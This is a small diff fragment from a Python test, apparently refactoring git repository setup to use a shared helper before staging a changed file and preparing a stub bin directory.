-        _init_repo_on_branch(repo, "main")
+        init_git_repo_with_commit(repo, branch="main")
         (repo / "f.txt").write_text("changed\n")
         _run_git(repo, "add", "f.txt")
         bin_dir = tmp_path / "bin-blocking-diff"
